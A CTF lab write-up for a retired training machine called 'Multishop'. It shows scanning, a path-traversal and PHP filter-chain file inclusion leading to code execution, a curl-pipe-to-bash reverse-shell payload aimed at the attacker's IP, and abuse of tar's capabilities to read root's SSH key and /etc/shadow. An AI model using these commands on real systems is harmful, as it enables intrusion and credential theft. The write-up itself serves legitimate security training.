---
title: "Multishop"
# date: 2019-04-18T15:34:30-04:00
categories:
  - blog
tags:
  - ctf
  - hacktrace-ranges
  - retired-mechines
---


### Affected Endpoint ###
Scope
```
    host/url:10.1.2.140
    Description: Access using hacktrace vpn
```
working time: 30 agustus - 2 september 2024

### Description ###
Background Story: The more you read, the more things you will know. The more you learn, the more places you will visit. 

vulnerability: file inclusion and Misuse of Linux Capabilities.

### Impact ###
Impact File Inclusion & Misuse of Linux Capabilities is:
- Information Disclosure.
- Code Execution.
- Privilege Escalation.
- System Integrity Compromise.

### Step To Reproduce ###
The steps in finding  vulnerability are as follows:
- Information Gathering.
- Enumeration.
- Exploit.
- Privilege escalation.
- Reporting.

### PoC ###
#### Information Gathering ####
Just as usual, we start off with the Nmap scan:
```
nmap -sCV -p- --min-rate=1000 -oN nmap -Pn 10.1.2.140
```
![alt text](/assets/images/hacktrace/multishop/image1.png)
There are two ports open: 22 (SSH), 80 (HTTP). Not having any credentials for the SSH service service, we will start with enumerating port 80. 
Scan directory using dirsearch
``` 
dirsearch -u http://10.1.2.140 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```
![alt text](/assets/images/hacktrace/multishop/image2.png)
Try scanning the directory again, this time it's interesting in the bio
```
dirsearch -u http://10.1.2.140/bio -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```
![alt text](/assets/images/hacktrace/multishop/image3.png)
That's it, nothing interesting, try looking into the url
![alt text](/assets/images/hacktrace/multishop/image4.png)
It looks like there is no upload file, I tried view-page:source
![alt text](/assets/images/hacktrace/multishop/image5.png)
There is a name parameter, this can indicate input validation, let's try to change the value 
```
http://10.1.2.140/bio/?name=../../../etc/passwd
```
![alt text](/assets/images/hacktrace/multishop/image6.png)
It turns out that we can do file inclusion, seen from the response given. 
Referensi file inclusion :
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md`
after reading through it turns out that file inclusion using wrappers (php: //filter) can be entered, we create the payload using the php_filter_chain_generator.py tool 
```
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```
later the payload will come out and paste it in the parameter name, if you want the book to continue.
![alt text](/assets/images/hacktrace/multishop/image7.png)
And it does, we can continue to rce, but we have to create a file and live python3 -m http.server, the steps are as follows:
1.	Create a file with the name l (fiel that contains revshel bash) why is the name l and does not contain extensions? because so that the payload is not too long, because it is usually an error, the length of url
 ![alt text](/assets/images/hacktrace/multishop/image8.png)
2.	After that, start the server with python3 -m http.server 80
 ![alt text](/assets/images/hacktrace/multishop/image9.png)
3.	Turn on nc to capture the payload we created in the file earlier nc -lvnp port
4.	Generate payload : python3 php_filter_chain.py --chain  '<?=`curl -s -L 10.18.200.165/l|bash`?>' (meaning that after successfully getting files from our machine server, it is immediately run)
  ![alt text](/assets/images/hacktrace/multishop/image10.png)
  ![alt text](/assets/images/hacktrace/multishop/image11.png)
Now the payload is successful, because the file can be obtained by the target server and immediately executed
5.	Successful, we have entered the server as www-data
  ![alt text](/assets/images/hacktrace/multishop/image12.png)
### Privilage Escalation ###
1.	Grab linpeas.sh from our machine and move it to the target machine with wget then run linpeas.sh 
2.	After running it successfully found Files with capabilities (limited to 50)
  ![alt text](/assets/images/hacktrace/multishop/image13.png)
  We can manipulate this to get root privileges. There is a capability reference for privsec.: 
  `https://juggernaut-sec.com/capabilities/`
3.	We use the /usr/bin/tar to get access rights, try to find id_rsa for ssh login as root.
4.	We move to the bin directory with the command: cd /usr/bin.
5.	then tar xf “/root/.ssh/id_rsa” -I '/bin/sh -c “cat 1>&2”' then the id_rsa output will come out.
  ![alt text](/assets/images/hacktrace/multishop/image14.png)
6.	managed to get the credential id_rsa to login to ssh as root without using a password, but we can also see the root password (/etc/shadow) by using this credential capability, but it takes time to decrypt the password and we also don't know what wordlist is used. This is the /etc/shadow file: 
  ![alt text](/assets/images/hacktrace/multishop/image15.png)
We see 2 passwords appear, but this takes a long time, so we use id_rsa for ssh login.
7.	Save the id_rsa that appears then chmod 600 nama_file, the meaning of chmod 600 is that only the file owner can read and write the file, keeping the data safe from unwanted access.
8.	Then ssh -i nama_file root@10.1.2.140
9.	Boom, the book can be logged in as the highest access rights root
  ![alt text](/assets/images/hacktrace/multishop/image16.png)


### USER FLAG = user.txt ###
### ROOT FLAG = root.txt ###

















